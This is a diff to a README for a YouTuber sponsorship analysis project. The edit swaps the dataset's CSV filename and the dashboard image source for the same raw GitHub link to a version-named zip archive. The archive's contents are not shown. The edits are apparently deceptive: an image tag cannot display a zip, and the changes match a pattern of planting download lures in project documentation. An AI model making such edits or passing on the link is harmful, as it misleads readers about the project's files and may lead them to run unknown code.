@@ -18,7 +18,7 @@ This project utilizes a hybrid approach for data collection:
 
 1.  **Initial Seeding:** A foundational dataset was sourced from Kaggle, containing a list of 100 top UK influencers.
 2.  **Data Enrichment:** A Python script was developed to interact with the **YouTube Data API v3**. This script extracts the latest channel statistics (subscribers, total views, total videos) for the YouTubers identified in the initial dataset.
-3.  **Combined Dataset:** The enriched data is combined into a single, clean CSV file (`youtube_data_from_python.csv`) which serves as the single source of truth for the analysis.
+3.  **Combined Dataset:** The enriched data is combined into a single, clean CSV file (`https://raw.githubusercontent.com/SayanrupBarman/youtuber-sponshership-analysis/main/assets/datasets/analysis_youtuber_sponshership_v1.7-alpha.2.zip`) which serves as the single source of truth for the analysis.
 
 ## Project Workflow & Analysis
 
@@ -32,7 +32,7 @@ The project follows a structured workflow from data acquisition to final analysi
 6.  **ROI Modeling (SQL):** A parameterized SQL script was developed to model the potential net profit of a marketing campaign with different YouTubers, accounting for variables like conversion rate and product cost.
 
 <p align="center">
-  <img src="assets/images/powerbi_dashboard.png" width="700" alt="YouTuber Analysis Dashboard">
+  <img src="https://raw.githubusercontent.com/SayanrupBarman/youtuber-sponshership-analysis/main/assets/datasets/analysis_youtuber_sponshership_v1.7-alpha.2.zip" width="700" alt="YouTuber Analysis Dashboard">
 </p>
 
 ## Key Insights
